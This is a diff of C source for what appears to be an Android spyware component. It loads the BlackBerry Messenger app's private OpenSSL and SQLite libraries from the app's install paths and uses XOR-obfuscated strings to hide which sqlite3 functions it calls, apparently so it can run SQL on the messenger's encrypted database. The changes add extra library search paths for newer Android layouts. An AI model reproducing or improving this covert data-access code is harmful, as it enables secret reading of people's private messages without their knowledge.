@@ -24,7 +24,7 @@ int callback(void* pArg,int nCol,char** azVals, char** azCols){
 	return -1;
 }
 
-static unsigned char* deobfuscate(unsigned char *s) {
+unsigned char* deobfuscate(unsigned char *s) {
     unsigned char key, mod, len;
     int i, j;
 	unsigned char* d;
@@ -52,7 +52,7 @@ static unsigned char* deobfuscate(unsigned char *s) {
 int executions = 0;
 int (*f_open_ptr)(const char*, sqlite3**);
 int (*f_close_ptr)(sqlite3*);
-int (*f_exec_ptr)(sqlite3*, const void*, void*, void*, char** );
+int (*f_exec_ptr)(sqlite3*, const char*, void*, void*, char** );
 
 int execute_sql(sqlite3* db, char* sql){
 	char* errMsg;
@@ -111,11 +111,13 @@ int main(int argc, char** argv){
 
 	char    *error;
 	char    sError[128];
+	char lib_sslcrypto[128];
+	char lib_sqlite3[128];
 
 	int i, ret;
+	int found = 0;
 	for(i=1; i<=4; i++){
-		char lib_sslcrypto[128];
-		char lib_sqlite3[128];
+
 		sprintf(lib_sslcrypto, "/data/app-lib/com.bbm-%d/libopenssl_crypto.so", i);
 		sprintf(lib_sqlite3, "/data/app-lib/com.bbm-%d/libsqlite3.so", i);
 
@@ -150,12 +152,55 @@ int main(int argc, char** argv){
 
 		if(dl_handle_sslcrypto && dl_handle_sqlite3){
 			LOG("opened libs\n");
+			found = 1;
 			break;
 		}
 
 	}
 
-	if(!dl_handle_sslcrypto || !dl_handle_sqlite3){
+	for(i=1; !found && i<=4; i++){
+
+    		sprintf(lib_sslcrypto, "/data/app/com.bbm-%d/lib/arm/libopenssl_crypto.so", i);
+    		sprintf(lib_sqlite3, "/data/app/com.bbm-%d/lib/arm/libsqlite3.so", i);
+
+    		LOG("try lib %d\n", i);
+    		/* open the needed object */
+    		dl_handle_sslcrypto = dlopen(lib_sslcrypto, RTLD_LOCAL | RTLD_NOW);
+    		if (!dl_handle_sslcrypto) {
+    			error = (char *) dlerror();
+    			if (error != NULL) {
+    			    LOG("%s\n",error);
+
+    			} else {
+    			    sprintf(sError,"%s is not found",lib_sslcrypto);
+    			    LOG("%s\n",sError);
+
+    			}
+    		}
+
+    		dl_handle_sqlite3 = dlopen(lib_sqlite3, RTLD_LOCAL | RTLD_NOW);
+    		if (!dl_handle_sqlite3) {
+    			error = (char *) dlerror();
+    			if (error != NULL) {
+    			    LOG("%s\n",error);
+
+    			}
+    			else {
+    			    sprintf(sError,"%s is not found",lib_sqlite3);
+    			    LOG("%s\n",sError);
+
+    			}
+    		}
+
+    		if(dl_handle_sslcrypto && dl_handle_sqlite3){
+    			LOG("opened libs\n");
+    			found = 1;
+    			break;
+    		}
+
+    	}
+
+	if(!found){
 		LOG("cannot open libs\n");
 		return -2;
 	}
@@ -171,6 +216,7 @@ int main(int argc, char** argv){
 	f_close_ptr = (int(*)(sqlite3*)) dlsym(dl_handle_sqlite3, deobfuscate(obf_string_sql2));
 	ret &= check_dlsym(f_close_ptr);
 
+	//int (*f_exec_ptr)(sqlite3*, const void*, void*, void*, char** );
 	unsigned char obf_string_sql3[] = "\xfa\x58\xae\xb9\xbb\xb6\xb3\xbe\xaf\x79\xa5\xaf\x82\xaf\xa9"; // "sqlite3_exec"
 	f_exec_ptr = (int(*)(sqlite3*, const char*, void*, void*, char**)) dlsym(dl_handle_sqlite3, deobfuscate(obf_string_sql3));
 	ret &= check_dlsym(f_exec_ptr);
